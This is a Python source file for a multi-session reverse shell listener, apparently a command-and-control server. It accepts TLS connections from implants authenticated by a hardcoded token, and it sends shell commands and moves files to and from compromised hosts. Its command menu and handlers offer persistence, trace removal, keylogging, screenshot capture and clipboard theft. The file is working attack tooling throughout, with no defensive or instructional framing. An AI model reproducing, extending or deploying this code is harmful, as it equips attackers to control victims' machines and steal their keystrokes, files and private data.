#!/usr/bin/env python3
import socket
import threading
import sys
import ssl
import os
import base64
import datetime
import json
import select
import termios
import tty

# Configuration
SHARED_SECRET = "SuperSecretToken123"

# Global variables
sessions = {}
session_lock = threading.Lock()
LOG_FILE = f"listener_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def log_event(event):
    """Log events to file"""
    try:
        with open(LOG_FILE, 'a') as log:
            log.write(f"[{datetime.datetime.now().isoformat()}] {event}\n")
    except Exception:
        pass

def safe_decode(data):
    """Safely decode base64 or regular data"""
    try:
        return base64.b64decode(data).decode('utf-8', errors='ignore')
    except Exception:
        return data.decode('utf-8', errors='ignore')

def safe_encode(data):
    """Safely encode data to base64"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data)

def create_ssl_cert():
    """Create self-signed SSL certificate if it doesn't exist"""
    if not (os.path.exists('server.pem') and os.path.exists('server.key')):
        print("[+] Creating self-signed SSL certificate...")
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime
            
            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            
            # Create certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "State"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "City"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Test"),
                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.datetime.utcnow()
            ).not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=365)
            ).sign(private_key, hashes.SHA256())
            
            # Write private key
            with open('server.key', 'wb') as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            # Write certificate
            with open('server.pem', 'wb') as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            print("[+] SSL certificate created successfully")
            
        except ImportError:
            print("[!] cryptography library not available. Creating basic cert with openssl...")
            os.system('openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365 -nodes -subj "/C=US/ST=State/L=City/O=Test/CN=localhost"')

class ClientSession(threading.Thread):
    """Handle individual client session"""
    
    def __init__(self, conn, addr, session_id):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.session_id = session_id
        self.active = True
        self.buffer = b''
        self.info = {"os": "Unknown", "user": "Unknown"}
        self.sysinfo_received = False
    
    def run(self):
        """Session thread main loop"""
        while self.active:
            try:
                data = self.conn.recv(4096)
                if not data:
                    break
                with session_lock:
                    # Check for system info message
                    if not self.sysinfo_received:
                        try:
                            decoded = safe_decode(data)
                            if decoded.startswith("SYSINFO::"):
                                sysinfo_json = decoded[len("SYSINFO::"):]
                                try:
                                    sysinfo = json.loads(sysinfo_json)
                                    self.info = sysinfo
                                except Exception:
                                    self.info = {"raw": sysinfo_json}
                                self.sysinfo_received = True
                                continue
                        except Exception:
                            pass
                    self.buffer += data
            except Exception:
                break
        
        self.active = False
        try:
            self.conn.close()
        except Exception:
            pass
        
        with session_lock:
            if self.session_id in sessions:
                del sessions[self.session_id]
    
    def send_command(self, cmd):
        """Send command to client"""
        try:
            encoded = safe_encode(cmd)
            self.conn.send(encoded)
            return True
        except Exception:
            self.active = False
            return False
    
    def get_response(self, timeout=5):
        """Get response from client buffer"""
        start_time = datetime.datetime.now()
        while (datetime.datetime.now() - start_time).seconds < timeout:
            with session_lock:
                if self.buffer:
                    output = self.buffer
                    self.buffer = b''
                    return safe_decode(output)
            threading.Event().wait(0.1)
        return "[!] No response received (timeout)"
    
    def handle_file_download(self, remote_path, local_path):
        """Handle file download from client"""
        try:
            self.send_command(f'download {remote_path}')
            
            # Get file size
            size_bytes = self.conn.recv(8)
            size = int.from_bytes(size_bytes, 'big')
            
            if size == 0:
                return f"[!] Remote file not found: {remote_path}"
            
            # Receive file data
            b64data = b''
            while len(b64data) < size:
                chunk = self.conn.recv(min(4096, size - len(b64data)))
                if not chunk:
                    break
                b64data += chunk
            
            # Decode and save
            data = base64.b64decode(b64data)
            with open(local_path, 'wb') as f:
                f.write(data)
            
            return f"[+] Downloaded to {local_path} ({len(data)} bytes)"
            
        except Exception as e:
            return f"[!] Download error: {e}"
    
    def handle_file_upload(self, local_path, remote_path):
        """Handle file upload to client"""
        try:
            if not os.path.isfile(local_path):
                return f"[!] Local file not found: {local_path}"
            
            self.send_command(f'upload {remote_path}')
            
            # Read and encode file
            with open(local_path, 'rb') as f:
                data = f.read()
            b64data = base64.b64encode(data)
            
            # Send file size and data
            self.conn.sendall(len(b64data).to_bytes(8, 'big'))
            self.conn.sendall(b64data)
            
            # Get response
            resp = self.conn.recv(1024)
            return safe_decode(resp)
            
        except Exception as e:
            return f"[!] Upload error: {e}"

def print_help():
    """Print help information"""
    help_text = """
=== Reverse Shell Listener Commands ===

Session Management:
  list                 List active sessions
  select <id>          Interact with a session
  exit                 Exit the listener
  help                 Show this help

Session Commands (when session selected):
  Basic:
    <command>          Execute system command
    exit               Return to main menu
    
  File Operations:
    upload <local> <remote>     Upload file to client
    download <remote> <local>   Download file from client
    
  Information Gathering:
    sysinfo            Get detailed system information
    ps                 List running processes
    
  Persistence & Control:
    persist            Add persistence (registry/crontab)
    selfdestruct       Remove traces and exit client
    
  Monitoring:
    keylog_start       Start keylogger
    keylog_stop        Stop keylogger
    keylog_dump <path> Download keylog file
    screenshot <path>  Take screenshot
    clipboard          Get clipboard contents
"""
    print(help_text)

def interact_with_session(session):
    """Interactive session handler"""
    print(f"\n[+] Interacting with Session {session.session_id} ({session.addr[0]}:{session.addr[1]})")
    print("Type 'help' for session commands or 'exit' to return to main menu")
    
    while session.active:
        try:
            cmd = input(f"Session {session.session_id}> ").strip()
            
            if not cmd:
                continue
                
            if cmd.lower() == 'exit':
                break
                
            if cmd.lower() == 'help':
                print_help()
                continue
            
            log_event(f"Command sent to Session {session.session_id}: {cmd}")
            
            # Handle special commands
            if cmd.startswith('upload '):
                parts = cmd.split(maxsplit=2)
                if len(parts) == 3:
                    result = session.handle_file_upload(parts[1], parts[2])
                    print(result)
                else:
                    print("[!] Usage: upload <local_path> <remote_path>")
                continue
                
            elif cmd.startswith('download '):
                parts = cmd.split(maxsplit=2)
                if len(parts) == 3:
                    result = session.handle_file_download(parts[1], parts[2])
                    print(result)
                else:
                    print("[!] Usage: download <remote_path> <local_path>")
                continue
                
            elif cmd.startswith('keylog_dump '):
                parts = cmd.split(maxsplit=1)
                if len(parts) == 2:
                    local_path = parts[1]
                    result = session.handle_file_download('keylog.txt', local_path)
                    print(result)
                else:
                    print("[!] Usage: keylog_dump <local_path>")
                continue
                
            elif cmd.startswith('screenshot '):
                parts = cmd.split(maxsplit=1)
                if len(parts) == 2:
                    local_path = parts[1]
                    if session.send_command('screenshot temp'):
                        # Handle screenshot download
                        try:
                            size_bytes = session.conn.recv(8)
                            size = int.from_bytes(size_bytes, 'big')
                            
                            if size == 0:
                                print("[!] Screenshot failed or not supported")
                                continue
                            
                            b64data = b''
                            while len(b64data) < size:
                                chunk = session.conn.recv(min(4096, size - len(b64data)))
                                if not chunk:
                                    break
                                b64data += chunk
                            
                            data = base64.b64decode(b64data)
                            with open(local_path, 'wb') as f:
                                f.write(data)
                            
                            print(f"[+] Screenshot saved to {local_path} ({len(data)} bytes)")
                            
                        except Exception as e:
                            print(f"[!] Screenshot error: {e}")
                else:
                    print("[!] Usage: screenshot <local_path>")
                continue
            
            # Send regular command
            if session.send_command(cmd):
                if cmd == 'clipboard':
                    # Handle clipboard response
                    try:
                        size_bytes = session.conn.recv(8)
                        size = int.from_bytes(size_bytes, 'big')
                        
                        if size == 0:
                            print("[!] Clipboard access failed or clipboard is empty")
                        else:
                            b64data = b''
                            while len(b64data) < size:
                                chunk = session.conn.recv(min(4096, size - len(b64data)))
                                if not chunk:
                                    break
                                b64data += chunk
                            
                            data = base64.b64decode(b64data)
                            print(f"[+] Clipboard contents:\n{data.decode('utf-8', errors='ignore')}")
                    except Exception as e:
                        print(f"[!] Clipboard error: {e}")
                else:
                    # Get regular response
                    response = session.get_response()
                    if response:
                        # Pretty print JSON responses
                        try:
                            if response.startswith('{') or response.startswith('['):
                                data = json.loads(response)
                                print(json.dumps(data, indent=2))
                            else:
                                print(response)
                        except json.JSONDecodeError:
                            print(response)
                        
                        log_event(f"Response from Session {session.session_id}: {response[:200]}...")
            else:
                print("[!] Failed to send command - session may be closed")
                break
                
        except KeyboardInterrupt:
            print("\n[!] Interrupted. Returning to main menu.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
    
    print(f"[+] Exited Session {session.session_id}")

def start_listener(listen_ip, listen_port):
    """Start the multi-session listener"""
    
    # Create SSL certificate if needed
    create_ssl_cert()
    
    # Setup SSL context
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile="server.pem", keyfile="server.key")
    except Exception as e:
        print(f"[!] SSL setup error: {e}")
        print("[!] Make sure server.pem and server.key exist")
        return
    
    # Create and bind socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((listen_ip, listen_port))
        s.listen(5)
        print(f"[+] Listening on {listen_ip}:{listen_port} (SSL/TLS enabled)")
        print("[+] Type 'help' for available commands")
    except Exception as e:
        print(f"[!] Failed to start listener: {e}")
        return
    
    def accept_clients():
        """Accept incoming client connections"""
        session_id = 1
        while True:
            try:
                conn, addr = s.accept()
                log_event(f"Connection attempt from {addr[0]}:{addr[1]}")
                
                try:
                    # Wrap with SSL
                    ssl_conn = context.wrap_socket(conn, server_side=True)
                    
                    # Authenticate client
                    token = ssl_conn.recv(1024).decode().strip()
                    if token != SHARED_SECRET:
                        log_event(f"Authentication failed from {addr[0]}:{addr[1]}")
                        print(f"[!] Authentication failed from {addr[0]}:{addr[1]}")
                        ssl_conn.close()
                        continue
                    
                    log_event(f"Authenticated connection from {addr[0]}:{addr[1]} (Session {session_id})")
                    print(f"[+] New authenticated session from {addr[0]}:{addr[1]} (Session {session_id})")
                    
                    # Create client session
                    client = ClientSession(ssl_conn, addr, session_id)
                    with session_lock:
                        sessions[session_id] = client
                    client.start()
                    session_id += 1
                    
                except ssl.SSLError as e:
                    log_event(f"SSL error from {addr[0]}:{addr[1]}: {e}")
                    print(f"[!] SSL error from {addr[0]}:{addr[1]}: {e}")
                    conn.close()
                except Exception as e:
                    log_event(f"Client setup error from {addr[0]}:{addr[1]}: {e}")
                    print(f"[!] Client setup error: {e}")
                    conn.close()
                    
            except Exception as e:
                log_event(f"Accept error: {e}")
                continue
    
    # Start accepting clients in background
    threading.Thread(target=accept_clients, daemon=True).start()
    
    # Main command loop
    print("\n" + "="*50)
    print("Multi-Session Reverse Shell Listener")
    print("="*50)
    
    while True:
        try:
            cmd = input("MultiShell> ").strip()
            
            if not cmd:
                continue
                
            if cmd.lower() == "help":
                print_help()
                
            elif cmd.lower() == "list":
                with session_lock:
                    if not sessions:
                        print("No active sessions.")
                    else:
                        print(f"{'ID':<3} {'Address':<21} {'Status':<8} {'User':<10} {'OS':<20} {'Info'}")
                        print("-" * 80)
                        for sid, sess in sessions.items():
                            status = "active" if sess.active else "closed"
                            user = sess.info.get('user', 'Unknown')
                            osinfo = sess.info.get('platform', sess.info.get('os', 'Unknown'))
                            info = sess.info.get('hostname', '')
                            print(f"{sid:<3} {sess.addr[0]}:{sess.addr[1]:<15} {status:<8} {user:<10} {osinfo:<20} {info}")
                            
            elif cmd.startswith("select "):
                try:
                    parts = cmd.split()
                    if len(parts) != 2:
                        print("[!] Usage: select <session_id>")
                        continue
                        
                    sid = int(parts[1])
                    with session_lock:
                        if sid not in sessions:
                            print(f"[!] Session {sid} not found")
                            continue
                        if not sessions[sid].active:
                            print(f"[!] Session {sid} is closed")
                            continue
                        selected_session = sessions[sid]
                    
                    interact_with_session(selected_session)
                    
                except ValueError:
                    print("[!] Invalid session ID")
                except Exception as e:
                    print(f"[!] Error selecting session: {e}")
                    
            elif cmd.lower() == "exit":
                print("[+] Shutting down listener...")
                break
                
            else:
                print(f"[!] Unknown command: {cmd}")
                print("Type 'help' for available commands")
                
        except KeyboardInterrupt:
            print("\n[+] Shutting down listener...")
            break
        except Exception as e:
            print(f"[!] Command error: {e}")
    
    # Cleanup
    try:
        s.close()
    except Exception:
        pass
    
    print("[+] Listener stopped")

def main():
    """Main function"""
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <listen_ip> <listen_port>")
        print("Example: python3 reverse_shell_listener_multi.py 0.0.0.0 4444")
        sys.exit(1)
    
    try:
        listen_ip = sys.argv[1]
        listen_port = int(sys.argv[2])
        start_listener(listen_ip, listen_port)
    except ValueError:
        print("[!] Invalid port number")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()